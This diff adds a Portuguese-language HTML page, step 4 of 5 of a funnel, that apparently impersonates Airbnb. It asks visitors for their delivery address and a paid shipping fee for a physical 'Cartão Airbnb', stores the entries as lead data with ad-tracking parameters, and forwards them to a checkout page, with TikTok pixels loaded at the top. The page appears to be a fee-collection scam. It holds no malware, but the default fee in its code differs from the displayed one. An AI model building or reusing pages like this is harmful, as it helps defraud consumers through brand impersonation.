@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<script>
+  window.tikTokPixelId = "69edaaffbdf66cc14237f33f";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];
+  ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"];
+  ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};
+  for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);
+  ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e};
+  ttq.load=function(e,n){
+    var r="https://analytics.tiktok.com/i18n/pixel/events.js";
+    ttq._i=ttq._i||{};ttq._i[e]=[];ttq._i[e]._u=r;
+    ttq._t=ttq._t||{};ttq._t[e]=+new Date;
+    ttq._o=ttq._o||{};ttq._o[e]=n||{};
+    n=document.createElement("script");n.type="text/javascript";n.async=!0;
+    n.src=r+"?sdkid="+e+"&lib="+t;
+    e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)
+  };
+  ttq.load("D7MEITBC77U9TECL9BF0");
+  ttq.page();
+}(window, document, "ttq");
+</script>
+<!-- TikTok Pixel Code End -->
+
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Endereço de Entrega — Cartão Airbnb</title>
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+        :root{--red:#FF385C;--red-dark:#E00B41;--black:#1A1A1A;--gray:#6A6A6A;--gray-light:#DDDDDD;--bg:#F7F7F7;--white:#FFFFFF;--green:#34C759;--error:#FF3B30;--font:'Sora',-apple-system,sans-serif}
+        body{font-family:var(--font);background:var(--bg);color:var(--black);-webkit-font-smoothing:antialiased;min-height:100vh}
+        .page{max-width:520px;margin:0 auto;min-height:100vh;background:var(--white)}
+
+        .nav{display:flex;align-items:center;padding:14px 20px;border-bottom:1px solid var(--gray-light);background:rgba(255,255,255,.96);backdrop-filter:blur(10px);position:sticky;top:0;z-index:100}
+        .nav-back{width:32px;height:32px;display:flex;align-items:center;justify-content:center;border:none;background:var(--bg);border-radius:50%;cursor:pointer;font-size:14px;color:var(--black)}
+        .nav-title{flex:1;text-align:center;font-size:.92rem;font-weight:700}
+        .nav-step{font-size:.72rem;color:var(--gray);width:40px;text-align:right}
+
+        .progress{height:3px;background:var(--gray-light)}
+        .prog-bar{height:100%;background:linear-gradient(90deg,var(--red),var(--red-dark));border-radius:2px;transition:width .5s ease;width:70%}
+
+        .content{padding:24px 20px}
+
+        .addr-icon{width:64px;height:64px;border-radius:18px;background:#FFF0F3;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:26px;color:var(--red)}
+        .s-title{font-size:1.15rem;font-weight:800;text-align:center;margin-bottom:5px}
+        .s-desc{font-size:.82rem;color:var(--gray);text-align:center;margin-bottom:24px;line-height:1.6}
+
+        .fg{margin-bottom:14px;position:relative}
+        .fl{font-size:.78rem;font-weight:700;margin-bottom:6px;display:flex;align-items:center;gap:5px;color:var(--black)}
+        .fl i{font-size:12px;color:var(--gray-light)}
+        .fi{width:100%;padding:13px 14px;border:1.5px solid var(--gray-light);border-radius:12px;font-size:.93rem;font-family:var(--font);color:var(--black);background:var(--white);outline:none;transition:.2s}
+        .fi:focus{border-color:var(--red);box-shadow:0 0 0 3px rgba(255,56,92,.1)}
+        .fi.ok{border-color:var(--green)}
+        .fi.err{border-color:var(--error)}
+        .fi:disabled{background:var(--bg);color:var(--gray)}
+        .fi::placeholder{color:var(--gray-light)}
+        .fhint{font-size:.68rem;color:var(--gray);margin-top:4px}
+        .ferr{font-size:.68rem;color:var(--error);margin-top:4px;display:none}
+        .ferr.show{display:block}
+        .frow{display:grid;grid-template-columns:1fr 2fr;gap:12px}
+
+        /* CEP loader */
+        .cep-wrap{position:relative}
+        .cep-spin{position:absolute;right:14px;top:50%;transform:translateY(-50%);width:18px;height:18px;border:2px solid var(--gray-light);border-top-color:var(--red);border-radius:50%;animation:spin .7s linear infinite;display:none}
+        .cep-ok{position:absolute;right:14px;top:50%;transform:translateY(-50%);font-size:16px;color:var(--green);display:none}
+        @keyframes spin{to{transform:translateY(-50%) rotate(360deg)}}
+
+        /* Address preview */
+        .addr-prev{padding:14px;background:var(--bg);border-radius:14px;margin:14px 0;display:none;border:1px solid var(--gray-light);animation:spring .4s cubic-bezier(.175,.885,.32,1.275)}
+        .addr-prev.show{display:block}
+        @keyframes spring{from{opacity:0;transform:scale(.93)}to{opacity:1;transform:scale(1)}}
+        .ap-row{display:flex;justify-content:space-between;padding:5px 0;font-size:.8rem}
+        .ap-lbl{color:var(--gray)}
+        .ap-val{font-weight:700;text-align:right;max-width:58%}
+
+        /* Frete cards */
+        .frete-title{font-size:.85rem;font-weight:700;margin:18px 0 12px}
+        .frete-opts{display:flex;flex-direction:column;gap:10px;margin-bottom:20px}
+        .frete-opt{display:flex;align-items:center;gap:12px;padding:14px;border:1.5px solid var(--gray-light);border-radius:14px;cursor:pointer;transition:.2s}
+        .frete-opt:hover{border-color:rgba(255,56,92,.4)}
+        .frete-opt.sel{border-color:var(--red);background:rgba(255,56,92,.04)}
+        .fo-radio{width:20px;height:20px;border-radius:50%;border:2px solid var(--gray-light);flex-shrink:0;transition:.2s;display:flex;align-items:center;justify-content:center}
+        .frete-opt.sel .fo-radio{border-color:var(--red);background:var(--red)}
+        .frete-opt.sel .fo-radio::after{content:'';width:7px;height:7px;border-radius:50%;background:#fff}
+        .fo-info{flex:1}
+        .fo-name{font-size:.875rem;font-weight:700}
+        .fo-desc{font-size:.72rem;color:var(--gray);margin-top:2px}
+        .fo-price{font-size:.92rem;font-weight:800;color:var(--red)}
+
+        .submit-btn{width:100%;padding:16px;border:none;border-radius:14px;font-size:.98rem;font-weight:700;cursor:pointer;font-family:var(--font);background:linear-gradient(135deg,var(--red),var(--red-dark));color:#fff;transition:.2s;margin-top:4px}
+        .submit-btn:hover{filter:brightness(1.05);transform:translateY(-1px)}
+        .submit-btn:disabled{background:var(--gray-light);color:var(--gray);cursor:not-allowed;transform:none}
+    </style>
+</head>
+<body>
+<div class="page">
+    <div class="nav">
+        <button class="nav-back" onclick="history.back()"><i class="fas fa-chevron-left"></i></button>
+        <div class="nav-title">Endereço de Entrega</div>
+        <div class="nav-step">4/5</div>
+    </div>
+    <div class="progress"><div class="prog-bar"></div></div>
+
+    <div class="content">
+        <div class="addr-icon"><i class="fas fa-map-marker-alt"></i></div>
+        <h2 class="s-title">Para onde enviar seu cartão?</h2>
+        <p class="s-desc">Informe o endereço onde deseja receber seu Cartão Airbnb físico.</p>
+
+        <div class="fg cep-wrap">
+            <label class="fl"><i class="fas fa-map-pin"></i> CEP</label>
+            <input type="tel" class="fi" id="cep" placeholder="00000-000" maxlength="9">
+            <div class="cep-spin" id="cepSpin"></div>
+            <div class="cep-ok" id="cepOk"><i class="fas fa-check-circle"></i></div>
+            <div class="fhint">Digite o CEP para buscar o endereço automaticamente</div>
+            <div class="ferr" id="cepErr">CEP não encontrado. Verifique e tente novamente.</div>
+        </div>
+
+        <div id="addrFields" style="display:none">
+            <div class="fg">
+                <label class="fl">Rua / Logradouro</label>
+                <input type="text" class="fi" id="rua" placeholder="Rua, Avenida...">
+            </div>
+            <div class="frow">
+                <div class="fg">
+                    <label class="fl">Número</label>
+                    <input type="tel" class="fi" id="numero" placeholder="Nº" oninput="checkForm()">
+                </div>
+                <div class="fg">
+                    <label class="fl">Complemento</label>
+                    <input type="text" class="fi" id="comp" placeholder="Apto, Bloco...">
+                </div>
+            </div>
+            <div class="fg">
+                <label class="fl">Bairro</label>
+                <input type="text" class="fi" id="bairro" placeholder="Bairro">
+            </div>
+            <div class="frow">
+                <div class="fg">
+                    <label class="fl">UF</label>
+                    <input type="text" class="fi" id="uf" placeholder="UF" maxlength="2" disabled>
+                </div>
+                <div class="fg">
+                    <label class="fl">Cidade</label>
+                    <input type="text" class="fi" id="cidade" placeholder="Cidade" disabled>
+                </div>
+            </div>
+
+            <div class="addr-prev" id="addrPrev">
+                <div class="ap-row"><span class="ap-lbl">Endereço</span><span class="ap-val" id="pvRua">—</span></div>
+                <div class="ap-row"><span class="ap-lbl">Cidade/UF</span><span class="ap-val" id="pvCidade">—</span></div>
+            </div>
+
+            <div class="frete-title">Escolha a modalidade de entrega</div>
+            <div class="frete-opts">
+                <div class="frete-opt sel" onclick="selectFrete(this,'economico','R$ 24,90',12)" id="f1">
+                    <div class="fo-radio"></div>
+                    <div class="fo-info"><div class="fo-name">Econômico</div><div class="fo-desc">Prazo: 12–18 dias úteis</div></div>
+                    <div class="fo-price">R$ 24,90</div>
+                </div>
+                <div class="frete-opt" onclick="selectFrete(this,'expresso','R$ 34,90',5)" id="f2">
+                    <div class="fo-radio"></div>
+                    <div class="fo-info"><div class="fo-name">Expresso</div><div class="fo-desc">Prazo: 5–8 dias úteis</div></div>
+                    <div class="fo-price">R$ 34,90</div>
+                </div>
+                <div class="frete-opt" onclick="selectFrete(this,'premium','R$ 44,90',2)" id="f3">
+                    <div class="fo-radio"></div>
+                    <div class="fo-info"><div class="fo-name">Premium <i class="fas fa-bolt" style="color:#FFD700;font-size:11px"></i></div><div class="fo-desc">Prazo: 2–4 dias úteis</div></div>
+                    <div class="fo-price">R$ 44,90</div>
+                </div>
+            </div>
+
+            <button class="submit-btn" id="submitBtn" disabled onclick="submit()">
+                <i class="fas fa-check"></i> Confirmar entrega
+            </button>
+        </div>
+    </div>
+</div>
+
+<script>
+    (function(){var u=['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'];var p=new URLSearchParams(window.location.search);u.forEach(function(k){var v=p.get(k);if(v)localStorage.setItem(k,v);});})();
+    const LeadData={_k:'airbnb_lead',load(){try{return JSON.parse(localStorage.getItem(this._k)||'{}')}catch{return{}}},update(d){const c=this.load();const u={...c,...d,updated_at:Date.now()};localStorage.setItem(this._k,JSON.stringify(u));return u}};
+    function buildUrl(base,extra={}){const url=new URL(base,window.location.href);new URLSearchParams(window.location.search).forEach((v,k)=>url.searchParams.set(k,v));Object.entries(extra).forEach(([k,v])=>{if(v)url.searchParams.set(k,v)});return url.toString();}
+
+    let freteData={tipo:'economico',price:'R$ 14,90',dias:12};
+
+    function maskCep(el){let v=el.value.replace(/\D/g,'').slice(0,8);if(v.length>5)v=v.slice(0,5)+'-'+v.slice(5);el.value=v;if(v.replace(/\D/g,'').length===8)searchCep(v.replace(/\D/g,''));}
+    document.getElementById('cep').addEventListener('input',function(){maskCep(this);});
+
+    function searchCep(cep){
+        const spin=document.getElementById('cepSpin'),ok=document.getElementById('cepOk'),err=document.getElementById('cepErr');
+        spin.style.display='block';ok.style.display='none';err.classList.remove('show');
+        document.getElementById('cep').classList.remove('ok','err');
+        fetch(`https://viacep.com.br/ws/${cep}/json/`).then(r=>r.json()).then(d=>{
+            spin.style.display='none';
+            if(d.erro){document.getElementById('cep').classList.add('err');err.classList.add('show');return;}
+            document.getElementById('rua').value=d.logradouro||'';
+            document.getElementById('bairro').value=d.bairro||'';
+            document.getElementById('uf').value=d.uf||'';
+            document.getElementById('cidade').value=d.localidade||'';
+            document.getElementById('cep').classList.add('ok');
+            ok.style.display='block';
+            document.getElementById('addrFields').style.display='block';
+            document.getElementById('pvCidade').textContent=`${d.localidade}/${d.uf}`;
+            document.getElementById('addrPrev').classList.add('show');
+            setTimeout(()=>document.getElementById('numero').focus(),300);
+            checkForm();
+        }).catch(()=>{spin.style.display='none';document.getElementById('cep').classList.add('err');err.classList.add('show');});
+    }
+
+    function updatePreview(){
+        const r=document.getElementById('rua').value,n=document.getElementById('numero').value;
+        if(r&&n)document.getElementById('pvRua').textContent=`${r}, ${n}`;
+    }
+    document.getElementById('numero').addEventListener('input',()=>{updatePreview();checkForm();});
+
+    function selectFrete(el,tipo,price,dias){
+        document.querySelectorAll('.frete-opt').forEach(o=>o.classList.remove('sel'));
+        el.classList.add('sel');
+        freteData={tipo,price,dias};
+    }
+
+    function checkForm(){
+        const num=document.getElementById('numero').value.trim();
+        document.getElementById('submitBtn').disabled=!num;
+    }
+
+    function submit(){
+        const addr={cep:document.getElementById('cep').value,rua:document.getElementById('rua').value,numero:document.getElementById('numero').value,comp:document.getElementById('comp').value,bairro:document.getElementById('bairro').value,cidade:document.getElementById('cidade').value,uf:document.getElementById('uf').value};
+        LeadData.update({endereco:addr,frete:freteData,page:'cep'});
+        window.location.href=buildUrl('checkout.html',{frete_tipo:freteData.tipo,frete_price:freteData.price});
+    }
+</script>
+</body>
+</html>
+
